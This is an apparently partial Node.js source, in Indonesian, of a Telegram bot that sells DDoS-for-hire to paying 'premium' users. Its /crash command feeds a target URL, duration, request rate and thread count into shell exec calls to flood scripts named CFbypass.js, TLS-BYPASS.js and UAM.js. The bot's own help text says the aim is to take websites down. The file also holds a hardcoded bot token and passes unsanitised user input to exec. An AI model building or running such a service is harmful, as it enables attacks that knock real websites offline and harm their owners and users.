...
const token = '6635540933:AAEWKbIQX10GcKhOmG3P5yGJN1E0cYDqTgU';
...
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id; 
  bot.sendMessage(chatId, "🔥 *BERIKUT MENU BOT DDOS GARZZ* 🔥\n\n" +
  ...
  bot.sendMessage(chatId, "CHENEL SAYA ADA DI BAWAH👇",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❗ CHENEL ❗', url: 'https://t.me/dycoders' }
          ]
        ]
      },
      parse_mode: "Markdown"
  ...
  bot.sendMessage(chatId, "💀 BERIKUT LIST AKSES BOT DDOS 💀\n\n" +
    ...
    "🔥 CHENEL @testiunbanban 🔥",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '🛒 CONTACT 🛒', url: 'https://t.me/garzxy' }
          ]
        ]
      },
      parse_mode: "Markdown"
            ...
            bot.sendMessage(msg.chat.id, 'hai, ' + (msg.from.username || 'Unknown') + ' cara pake bot ddos nya gini\n1./crash web 60 64 5\n2./http web\n\nCONTOH\n1./crash https://skarti.vpn-store.my.id 60 64 5\n2./http https://skarti.vpn-store.my.id\n\nFUNGSI /crash adalah untuk down web / ddos web nya\nFUNGSI /http adalah untuk cek host / cek ke down / ddos atau gak', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium', 
                            url: 'https://t.me/garzxy'
                        }]
                    ]
                }
            });
        } else {
            bot.sendMessage(msg.chat.id, 'hai ' + (msg.from.username || 'Unknown') + '\nmaaf tidak bisa karena kamu belum menjadi user premium, mau jadi user premium?, bisa beli / sewa di saya admin @garzxy', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
...
bot.onText(/\/donasi/, (msg) => {
    ...
    const buttonOptions = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Donasi ke Saya', url: 'https://saweria.co/Garzz' }
                ]
            ]
        }
    };
...
bot.onText(/\/itools/, (msg) => {
    try {
        ...
        if (premiumUsers.has(msg.from.id.toString())) {
            ...
            bot.sendMessage(msg.chat.id, 'Hallo ' + (msg.from.username || 'Unknown') + '\nJika Anda belum menjadi anggota premium, jangan khawatir! Anda juga dapat menikmati pengalaman yang luar biasa dengan mengupgrade ke keanggotaan premium kami. Silakan hubungi @garzxy untuk informasi lebih lanjut. 🎭\nTerima kasih atas perhatian dan selamat bergabung dengan komunitas premium kami! 💥\n\n#PremiumMember #ExclusiveExperience #JoinTheCommunity', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
...
try {
  ...
  bot.onText(/\/crash (.+) (.+) (.+) (.+)/, (msg, match) => {
    ...
    if (isPremiumUser(userId)) {
      ...
      exec(`CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
      ...
      exec(`TLS-BYPASS.js ${web} ${time} ${req} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
      ...
      exec(`UAM.js ${web} ${time} ${req} ${thread} proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
